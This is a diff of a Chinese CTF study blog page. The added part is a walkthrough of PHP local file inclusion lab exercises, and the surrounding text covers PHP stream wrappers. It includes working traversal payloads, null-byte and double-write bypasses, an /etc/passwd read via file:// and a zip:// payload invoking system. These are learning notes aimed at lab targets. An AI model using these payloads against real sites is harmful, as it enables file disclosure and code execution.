@@ -14,7 +14,7 @@
 <meta property="og:description" content="Had a bad day来源：BSidesCF2020 考察：php伪协议绕过 进入页面，有两个按钮，点击后发现URL有变化，猜测为php伪协议 1http:&#x2F;&#x2F;06c5fe33-f46d-4bc0-9393-c91435db174c.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&amp;#x2F">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-01-22T06:44:29.000Z">
-<meta property="article:modified_time" content="2021-02-07T06:52:29.920Z">
+<meta property="article:modified_time" content="2021-02-10T07:03:35.662Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -152,7 +152,44 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret&#x3D;&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">w%ude($_GET[&quot;~)^&quot;])</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br><span class="line">1</span><br><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br></pre></td></tr></table></figure>
 <p>之后需要用到PHP segfault上传shell，不知道是啥，再说吧</p>
-<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.html，https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
+<h1 id="LFI-labs"><a href="#LFI-labs" class="headerlink" title="LFI labs"></a>LFI labs</h1><p>在phpstudy的根目录www下有一个phpinfo.php，以访问到这个文件为目标</p>
+<h2 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h2><p>原php文件路径中，form action处路径有问题，输入参数后无法跳转到正确页面，修改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;..&#x2F;LFI-1&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>之后访问URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-1&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h2><p>考察：%00截断</p>
+<p>观察index.php，关键语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;includes&#x2F;&quot;.$_GET[&#39;library&#39;].&quot;.php&quot;); </span><br></pre></td></tr></table></figure>
+<p>需要穿透includes目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
+<p>学习wp，发现本题考的不是这个。要是其后添加的后缀不是.php，则这个解法不能通过</p>
+<p>正确的姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING"><a href="#error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING" class="headerlink" title="error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);"></a>error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);</h3><p>报告除了E_NOTICE和E_WARNING之外的所有错误</p>
+<h2 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h2><p>关键语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (substr($_GET[&#39;file&#39;], -4, 4) !&#x3D; &#39;.php&#39;)</span><br></pre></td></tr></table></figure>
+<p>/.绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.&#x2F;</span><br></pre></td></tr></table></figure>
+<p>本题环境有问题，此处直接抄的wp</p>
+<h2 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h2><p>考察：不加后缀绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-4&#x2F;index.php?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
+<p><strong>错误的尝试</strong></p>
+<p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>
+<p>被转码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">includes&#x2F;class_&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php\0.php </span><br></pre></td></tr></table></figure>
+<p><strong>addslashes在ctf中等于无法绕过</strong></p>
+<h2 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h2><p>考察：双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<h2 id="LFI-6"><a href="#LFI-6" class="headerlink" title="LFI-6"></a>LFI-6</h2><p>考察：post提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data: page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
+<h2 id="LFI-7-14"><a href="#LFI-7-14" class="headerlink" title="LFI-7~14"></a>LFI-7~14</h2><p>基本相同，不再赘述</p>
+<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
+<p>四个函数</p>
+<p>include(), include_once(), require(), require_once()</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.html，https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
 <p>在不同的伪协议中，需要allow_url_fopen和allow_url_include的开启状态是不同的</p>
 <h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 访问本地文件</span><br><span class="line"># 不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd</span><br></pre></td></tr></table></figure>
@@ -171,6 +208,10 @@
 <h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;zip:&#x2F;&#x2F;C:\Users\liuxianglai\Desktop\test.jpg%23zip.txt</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;Users&#x2F;liuxianglai&#x2F;Desktop&#x2F;test.bz2</span><br></pre></td></tr></table></figure>
 <h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;绝对路径%23要解压的文件&amp;参数1&#x3D;值1&amp;参数2&#x3D;值2</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
 <h2 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;相对路径&#x2F;phar</span><br><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>
+<h2 id="还没学到的"><a href="#还没学到的" class="headerlink" title="还没学到的"></a>还没学到的</h2><p>包含日志</p>
+<p>包含环境变量environ</p>
+<p>利用session</p>
+
       
     </div>
     <footer class="article-footer">
@@ -216,7 +257,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" rel="tag">攻防世界wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E8%AF%AD/" rel="tag">日语</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
     </div>
   </div>
 
@@ -226,7 +267,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" style="font-size: 10px;">攻防世界wp</a> <a href="/tags/%E6%97%A5%E8%AF%AD/" style="font-size: 10px;">日语</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
     </div>
   </div>
 
@@ -248,23 +289,23 @@
       <ul>
         
           <li>
+            <a href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/">考证-日语-初级课文汉译日</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/">CTF-wp-攻防世界reverse初级</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">CTF-Web-文件上传</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/">CTF-Web-CTFer成长之路2.1</a>
           </li>
         
           <li>
             <a href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/">wp-CTFer成长之路-第一章</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/">CTFer成长之路_1.3.3 文件读取漏洞例题</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/01/CTF-Web-XSS/">CTF-Web-XSS</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
           </li>
         
       </ul>
